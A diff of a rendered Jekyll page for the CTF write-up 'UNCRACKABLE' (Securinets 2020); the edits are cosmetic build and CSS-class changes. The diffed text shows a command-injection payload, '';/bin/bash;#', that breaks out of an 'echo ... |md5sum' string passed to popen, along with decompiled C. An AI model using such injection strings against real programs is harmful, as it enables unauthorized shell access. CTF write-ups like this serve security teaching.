@@ -12,13 +12,13 @@
     <meta property="og:image" content="/writeups/ctf/securinetspreq2020/images/uncrackable_1.png">
     <meta property="og:description" content="Binary Pwn 666 pts.">
     <title>UNCRACKABLE</title><!-- Begin Jekyll SEO tag v2.6.1 -->
-<meta name="generator" content="Jekyll v4.0.0" />
+<meta name="generator" content="Jekyll v4.1.1" />
 <meta property="og:title" content="UNCRACKABLE" />
 <meta property="og:locale" content="en_US" />
 <link rel="canonical" href="http://localhost:4000/writeups/ctf/securinetspreq2020/uncrackable.html" />
 <meta property="og:url" content="http://localhost:4000/writeups/ctf/securinetspreq2020/uncrackable.html" />
 <script type="application/ld+json">
-{"url":"http://localhost:4000/writeups/ctf/securinetspreq2020/uncrackable.html","@type":"WebPage","headline":"UNCRACKABLE","@context":"https://schema.org"}</script>
+{"@type":"WebPage","url":"http://localhost:4000/writeups/ctf/securinetspreq2020/uncrackable.html","headline":"UNCRACKABLE","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 <link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
 
@@ -84,13 +84,13 @@
 
 <h2 id="exploitation">Exploitation</h2>
 <p>This is the original string:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"echo -n \'%s\'|md5sum"
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"echo -n \'%s\'|md5sum"
 </code></pre></div></div>
 <p>This is our exploit string:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>';/bin/bash;#
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>';/bin/bash;#
 </code></pre></div></div>
 <p>And this is going to be the final string:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"echo -n \'\';/bin/bash;#|md5sum;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"echo -n \'\';/bin/bash;#|md5sum;
 </code></pre></div></div>
 <p># - this is to comment out md5sum
 <br /></p>
@@ -99,7 +99,7 @@
 <img src="images/uncrackable_3.png" alt="file missing" />
 <br /></p>
 
-<p>This is because the output from STDOUT is being passed to the variable <code class="highlighter-rouge">local_458</code> instead of printing it. After that, the output is compared to the hard coded hash that’s why “not good enough” is printed.</p>
+<p>This is because the output from STDOUT is being passed to the variable <code class="language-plaintext highlighter-rouge">local_458</code> instead of printing it. After that, the output is compared to the hard coded hash that’s why “not good enough” is printed.</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
  <span class="n">sprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_459</span><span class="p">,</span><span class="s">"echo -n </span><span class="se">\'</span><span class="s">%s</span><span class="se">\'</span><span class="s">|md5sum"</span><span class="p">,</span><span class="n">local_48</span><span class="p">);</span>
   <span class="n">local_10</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_459</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
@@ -114,7 +114,7 @@
 <span class="p">...</span>
 </code></pre></div></div>
 <p><br />
-However, if we print the hash itself using the <code class="highlighter-rouge">echo</code> command, it should work.
+However, if we print the hash itself using the <code class="language-plaintext highlighter-rouge">echo</code> command, it should work.
 <img src="images/uncrackable_4.png" alt="file missing" />
 <br /></p>
 
